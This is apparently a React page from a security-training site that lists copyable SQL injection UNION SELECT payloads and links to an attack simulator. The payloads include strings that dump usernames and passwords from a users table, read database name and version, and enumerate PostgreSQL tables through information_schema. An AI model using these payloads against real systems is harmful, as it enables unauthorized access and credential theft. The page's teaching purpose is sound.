import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, Database, Copy, Check, Search, Terminal } from 'lucide-react';

const payloadSections = [
  {
    id: 'column-matching',
    title: 'Column Count & Type Matching',
    description: 'Before extracting data using a UNION attack, the attacker must match the exact number of columns returned by the original query and determine compatible data types. Injecting NULL values is the standard way to probe column counts since NULL is compatible with all data types.',
    payloads: [
      { code: "' UNION SELECT NULL, NULL -- ", desc: 'Probes column counts by appending two NULL columns. Compatible across SQLite, MySQL, and PostgreSQL.', tags: ['Probing', 'Standard'] },
      { code: "') UNION SELECT NULL, NULL -- ", desc: 'Parenthesized breakout attempting to probe nested query structures using NULL columns.', tags: ['Parenthesis', 'Probing'] },
      { code: "' UNION SELECT 1, 2 -- ", desc: 'Probes column position compatibility by injecting dummy numeric constants.', tags: ['Probing', 'Types'] },
      { code: "1' UNION SELECT 1, 'hacked' -- ", desc: 'Numeric parameter breakout injecting compatible numeric and string fields.', tags: ['Exploit', 'Numeric'] },
    ]
  },
  {
    id: 'data-extraction',
    title: 'Data Extraction & Schema Metadata',
    description: 'Once column counts and compatible types are determined, UNION queries are utilized to extract records from other tables in the database (such as users, schemas, or DBMS system variables).',
    payloads: [
      { code: "' UNION SELECT 1, 'UNION SUCCESS' -- ", desc: 'Verifies string data extraction capability by joining a standard success flag.', tags: ['Standard'] },
      { code: "') UNION SELECT 1, 'success' -- ", desc: 'Parenthesis breakout variant appending a verification string directly.', tags: ['Parenthesis', 'Standard'] },
      { code: "' UNION SELECT 'admin', 'password123' -- ", desc: 'Appends hardcoded administrative credentials to simulate auth bypasses.', tags: ['Auth Bypass'] },
      { code: "' UNION SELECT username, password FROM users -- ", desc: 'Directly dumps the entire credential catalog from the users database table.', tags: ['Extraction', 'Credentials'] },
      { code: "' UNION SELECT 1, CONCAT(username, ':', password) FROM users -- ", desc: 'Concats usernames and passwords into a single column. Essential for single-column displays.', tags: ['Extraction', 'MySQL'] },
      { code: "admin' UNION SELECT 1, 'bypassed' -- ", desc: 'Combines administrative username target filter with a dummy UNION query.', tags: ['Standard'] },
      { code: "' UNION SELECT 1, database() -- ", desc: 'Queries system functions to retrieve the name of the active database.', tags: ['Metadata', 'MySQL'] },
      { code: "' UNION SELECT 1, version() -- ", desc: 'Extracts DBMS kernel/server version details.', tags: ['Metadata', 'DBMS-Specific'] }
    ]
  },
  {
    id: 'postgresql-table-enumeration',
    title: 'PostgreSQL Table Enumeration',
    description: 'Metadata extraction payloads querying the database catalog to retrieve table structures, mappings, and system names.',
    payloads: [
      { code: "' UNION SELECT ROW_NUMBER() OVER (),table_name,0,0,'Database table discovered through information_schema','', 'table-record' FROM information_schema.tables WHERE table_schema='public' -- ", desc: 'Extracts table names from PostgreSQL information_schema and maps them into the seven-column Golimar Store product result structure.', tags: ['PostgreSQL', 'Metadata', 'Table Enumeration', 'UNION SELECT'] }
    ]
  }
];

export default function UnionAttackPayloads() {
  const [copiedText, setCopiedText] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  const allPayloads = [];
  payloadSections.forEach(section => {
    section.payloads.forEach(p => {
      allPayloads.push({
        ...p,
        sectionId: section.id,
        sectionTitle: section.title
      });
    });
  });

  const filteredPayloads = allPayloads.filter((p) => {
    const query = searchTerm.toLowerCase();
    return (
      p.code.toLowerCase().includes(query) ||
      p.desc.toLowerCase().includes(query) ||
      p.tags.some((t) => t.toLowerCase().includes(query))
    );
  });

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="space-y-10 select-none w-full max-w-5xl mx-auto">
      {/* Back Link */}
      <div className="flex items-center justify-between">
        <Link to="/payload-library" className="inline-flex items-center gap-2 text-xs font-mono text-cyber-dim hover:text-cyber-blue transition-colors">
          <ArrowLeft className="w-3.5 h-3.5" />
          back to payload library dashboard
        </Link>
        <span className="text-[10px] font-mono text-cyber-dim">MODULE: UNION_SELECT_v1.0</span>
      </div>

      {/* Header Info */}
      <div className="flex flex-col gap-2 border-b border-cyber-border/40 pb-6 w-full relative">
        <div className="absolute -top-4 right-0 w-24 h-24 bg-cyber-blue/10 blur-[40px] rounded-full pointer-events-none" />
        <span className="text-xs font-mono font-bold text-cyber-blue tracking-[4px] uppercase flex items-center gap-2">
          <Database className="w-4.5 h-4.5 text-cyber-blue" />
          MODULE 03 — UNION SELECT ATTACKS
        </span>
        <h1 className="text-3xl font-extrabold text-cyber-title tracking-wide uppercase">
          UNION Select <span className="text-cyber-blue">Payloads</span>
        </h1>
        <p className="text-cyber-dim text-sm text-justify leading-relaxed">
          Explore specialized queries designed to join secondary database results into the original server response buffers. Use column count matching and schema functions to extract sensitive records.
        </p>
      </div>

      {/* Interactive Search Bar */}
      <div className="relative w-full max-w-md">
        <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
        <input
          type="text"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          placeholder="Search UNION SELECT payloads..."
          className="w-full bg-cyber-input border border-cyber-border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none focus:border-cyber-blue focus:ring-1 focus:ring-cyber-blue/20 transition-all text-xs font-mono"
        />
      </div>

      {/* Main Payload Grid Section */}
      <div className="space-y-6">
        <div className="bg-cyber-card border border-cyber-border rounded-xl overflow-hidden shadow-lg">
          <div className="grid grid-cols-12 gap-3 px-6 py-3 border-b border-cyber-border bg-cyber-pre text-[10px] font-mono font-bold text-cyber-dim tracking-wider uppercase">
            <div className="col-span-4">Payload (SQL Code)</div>
            <div className="col-span-5">Mechanism & Impact Description</div>
            <div className="col-span-2">Tags</div>
            <div className="col-span-1 text-right">Actions</div>
          </div>

          <div className="divide-y divide-cyber-border/40 font-mono text-sm">
            {filteredPayloads.length > 0 ? (
              filteredPayloads.map((payload, pIdx) => (
                <div
                  key={pIdx}
                  className="grid grid-cols-12 gap-3 px-6 py-4 items-center hover:bg-cyber-blue/[0.02] transition-colors group"
                >
                  {/* Payload Code */}
                  <div className="col-span-4 select-text">
                    <code className="text-cyber-blue-light font-bold bg-cyber-pre/80 px-2.5 py-1.5 rounded-lg border border-cyber-border/60 block overflow-x-auto whitespace-nowrap">
                      {payload.code}
                    </code>
                  </div>

                  {/* Description */}
                  <div className="col-span-5 text-xs text-cyber-text leading-relaxed select-text font-sans">
                    {payload.desc}
                  </div>

                  {/* Tags */}
                  <div className="col-span-2 flex flex-wrap gap-1">
                    {payload.tags.map((tag, tIdx) => (
                      <span
                        key={tIdx}
                        className="text-[9px] font-bold uppercase tracking-wider bg-cyber-blue/10 border border-cyber-blue/20 text-cyber-blue-light px-1.5 py-0.2 rounded"
                      >
                        {tag}
                      </span>
                    ))}
                  </div>

                  {/* Actions */}
                  <div className="col-span-1 flex items-center justify-end gap-2">
                    <button
                      onClick={() => handleCopy(payload.code)}
                      className="p-1.5 rounded bg-cyber-pre border border-cyber-border hover:border-cyber-blue hover:bg-cyber-blue/5 text-cyber-dim hover:text-cyber-blue-light transition-all cursor-pointer relative"
                      title="Copy payload to clipboard"
                    >
                      {copiedText === payload.code ? (
                        <Check className="w-3.5 h-3.5 text-cyber-green" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                </div>
              ))
            ) : (
              <div className="px-6 py-12 text-center text-cyber-dim font-mono text-sm">
                No matching payloads found for "{searchTerm}"
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Sandbox Redirection */}
      <div className="bg-cyber-card border border-cyber-border/70 rounded-2xl p-8 text-center space-y-5 shadow-2xl relative overflow-hidden">
        <span className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyber-blue to-transparent" />
        <h3 className="font-sans font-extrabold text-lg text-cyber-title tracking-wider uppercase">
          Simulate this in our Interactive UNION Attack Environment!
        </h3>
        <p className="text-sm text-cyber-text text-justify leading-relaxed">
          Test these payloads inside our live UNION Select Simulator to witness real-time schema merging, socket connection streams, and verify unauthorized database data dumps!
        </p>
        <div className="pt-2 flex justify-center">
          <Link
            to="/attacks/union-attack"
            className="inline-flex items-center justify-center gap-2 bg-cyber-blue hover:bg-cyber-blue-light text-white px-8 py-3.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shadow-[0_0_15px_rgba(26,106,255,0.3)] hover:shadow-[0_0_25px_rgba(26,106,255,0.5)] transform hover:-translate-y-0.5"
          >
            Launch Live UNION Attack Simulator
          </Link>
        </div>
      </div>
    </div>
  );
}
